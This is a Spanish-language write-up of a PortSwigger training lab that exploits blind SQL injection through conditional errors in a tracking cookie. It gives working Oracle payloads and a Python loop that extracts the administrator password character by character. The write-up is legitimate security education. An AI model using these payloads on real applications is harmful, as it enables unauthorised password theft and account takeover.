# Lab 12 — Blind SQL Injection con errores condicionales

## Resumen

**Plataforma:** PortSwigger Web Security Academy  
**Categoría:** SQL Injection  
**Tipo:** Blind SQL Injection — Conditional Errors  
**Dificultad:** Practitioner

### Objetivo

Explotar una vulnerabilidad de Blind SQL Injection presente en la cookie `TrackingId` para obtener la contraseña del usuario `administrator` y utilizar esas credenciales para iniciar sesión en la aplicación.

---

## Vulnerabilidad

La aplicación utiliza la cookie `TrackingId` para realizar seguimiento de usuarios y posteriormente incorpora su valor dentro de una consulta SQL.

Los resultados de la consulta no se muestran directamente en la respuesta de la aplicación.

Además, la aplicación tampoco presenta un comportamiento diferente cuando la consulta devuelve filas.

Sin embargo, cuando la consulta SQL provoca un error, la aplicación devuelve una respuesta HTTP 500.

Esto permite utilizar los errores de la base de datos como un canal lateral para inferir información.

El comportamiento puede representarse de la siguiente manera:

```text
Condición verdadera
        ↓
Se provoca un error SQL
        ↓
HTTP 500

Condición falsa
        ↓
No se provoca un error
        ↓
Respuesta normal
```

De esta manera, la aplicación puede utilizarse como un **oráculo booleano**.

---

## 1. Identificación del punto de inyección

El parámetro vulnerable era la cookie:

```http
Cookie: TrackingId=H4AeyeR1AC5E4GQx
```

Primero se intentó provocar deliberadamente un error en la base de datos utilizando una operación de división por cero:

```text
H4AeyeR1AC5E4GQx' AND (SELECT 1/0 FROM dual)='1
```

La aplicación respondió con:

```text
HTTP/2 500 Internal Server Error
```

Esto permitió confirmar que el valor de `TrackingId` estaba siendo interpretado dentro de una consulta SQL y que los errores de la base de datos podían observarse mediante la respuesta HTTP.

---

## 2. Creación de un oráculo booleano

El siguiente paso consistió en provocar un error solamente cuando una determinada condición fuese verdadera.

Para ello se utilizó una estructura `CASE`:

```sql
CASE
    WHEN condicion
    THEN 1/0
    ELSE 1
END
```

La lógica es:

```text
Condición TRUE
      ↓
1/0
      ↓
Error SQL
      ↓
HTTP 500
```

Mientras que:

```text
Condición FALSE
      ↓
1
      ↓
Sin error
      ↓
Respuesta normal
```

Esto permitió transformar el comportamiento de la aplicación en un mecanismo de respuesta verdadero/falso.

---

## 3. Confirmación del usuario administrator

El laboratorio indica que existe una tabla llamada:

```text
users
```

con las columnas:

```text
username
password
```

Se comprobó la existencia del usuario `administrator` utilizando una condición que provocaría un error si la comparación era verdadera:

```text
H4AeyeR1AC5E4GQx' AND (SELECT CASE WHEN (SELECT username FROM users WHERE username='administrator')='administrator' THEN 1/0 ELSE 1 END FROM dual)='1
```

La aplicación respondió con:

```text
HTTP 500 Internal Server Error
```

Por lo tanto, la condición se evaluó como verdadera y se confirmó la existencia del usuario `administrator`.

---

## 4. Determinación de la longitud de la contraseña

El siguiente objetivo fue determinar cuántos caracteres tenía la contraseña del usuario `administrator`.

Se utilizó la función `LENGTH()`:

```text
H4AeyeR1AC5E4GQx' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))=20 THEN 1/0 ELSE 1 END FROM dual)='1
```

La aplicación devolvió nuevamente:

```text
HTTP 500 Internal Server Error
```

Esto permitió determinar que:

```text
Longitud de la contraseña = 20 caracteres
```

---

## 5. Extracción carácter por carácter

Una vez conocida la longitud, era posible comprobar cada carácter individualmente.

Como el laboratorio utiliza una base de datos Oracle, se utilizó la función:

```sql
SUBSTR()
```

La lógica utilizada fue:

```sql
SUBSTR(
    (SELECT password
     FROM users
     WHERE username='administrator'),
    posicion,
    1
)
```

El resultado se comparaba con un carácter determinado.

Por ejemplo, conceptualmente:

```sql
CASE
    WHEN SUBSTR(password, 1, 1)='a'
    THEN 1/0
    ELSE 1
END
```

Si el carácter era correcto:

```text
HTTP 500
```

Si era incorrecto:

```text
Respuesta normal
```

De esta manera era posible reconstruir la contraseña carácter por carácter.

---

## 6. Automatización con Python

Realizar todas las comprobaciones manualmente requeriría una gran cantidad de solicitudes.

Por este motivo, se automatizó el proceso utilizando Python.

El script realizó las siguientes tareas:

1. Mantener la sesión activa.
2. Modificar únicamente la cookie `TrackingId`.
3. Probar cada posición de la contraseña.
4. Comparar cada posición con diferentes caracteres.
5. Detectar un HTTP 500 como condición verdadera.
6. Construir progresivamente la contraseña.

La lógica principal utilizada fue:

```python
for position in range(1, 21):

    for char in charset:

        condition = (
            f"SUBSTR("
            f"(SELECT password FROM users "
            f"WHERE username='administrator'),"
            f"{position},1)='{char}'"
        )

        if check(condition):
            password += char
            break
```

La función utilizada para determinar si la condición era verdadera comprobaba el código HTTP:

```python
return response.status_code == 500
```

De esta manera, el script pudo automatizar la extracción de los 20 caracteres.

---

## 7. Autenticación

Una vez recuperada la contraseña mediante la Blind SQL Injection, se utilizaron las credenciales obtenidas para iniciar sesión como:

```text
administrator
```

El inicio de sesión fue exitoso y el laboratorio quedó resuelto.

---

## Conceptos aprendidos

### Blind SQL Injection

Una Blind SQL Injection ocurre cuando una aplicación es vulnerable a SQL Injection pero no muestra directamente los resultados de las consultas realizadas.

La información debe inferirse utilizando algún comportamiento observable de la aplicación.

### Errores condicionales

En este laboratorio, el comportamiento observable fue el error HTTP 500.

Se utilizó una condición para controlar cuándo se producía el error:

```text
TRUE  → Error → HTTP 500
FALSE → Sin error → Respuesta normal
```

Esto permitió utilizar la aplicación como un oráculo booleano.

### Oracle

El laboratorio utiliza una base de datos Oracle.

Durante la explotación se utilizaron características específicas de Oracle, como:

```sql
FROM dual
```

y:

```sql
SUBSTR()
```

La tabla `dual` permitió ejecutar expresiones que no necesitaban consultar directamente una tabla de la aplicación.

### Automatización

La extracción manual de información mediante Blind SQL Injection puede requerir cientos o miles de solicitudes.

La automatización con Python permite convertir este proceso en una técnica repetible y mucho más eficiente.

---

## Metodología

```text
Identificar TrackingId
        ↓
Provocar un error SQL
        ↓
Confirmar HTTP 500
        ↓
Crear un oráculo booleano
        ↓
Confirmar usuario administrator
        ↓
Determinar longitud de la contraseña
        ↓
Extraer caracteres mediante SUBSTR()
        ↓
Automatizar con Python
        ↓
Obtener la contraseña
        ↓
Autenticar como administrator
```

---

## Herramientas

- Burp Suite
- Burp Repeater
- Python
- PortSwigger Web Security Academy

---

## Conclusión

Este laboratorio demostró cómo una Blind SQL Injection puede explotarse incluso cuando la aplicación no devuelve directamente los resultados de las consultas.

La clave fue identificar que los errores SQL producían una respuesta HTTP 500 diferente de una respuesta normal.

A partir de este comportamiento se construyó un oráculo booleano que permitió realizar preguntas sobre los datos almacenados en la base de datos.

Finalmente, el proceso se automatizó mediante Python para recuperar la contraseña del usuario `administrator` carácter por carácter.

Este laboratorio también permitió aplicar una metodología similar a la utilizada en el laboratorio anterior, pero utilizando un canal lateral diferente:

```text
Lab 11:
TRUE  → "Welcome back"

Lab 12:
TRUE  → HTTP 500
```

**Estado del laboratorio: Resuelto ✅**
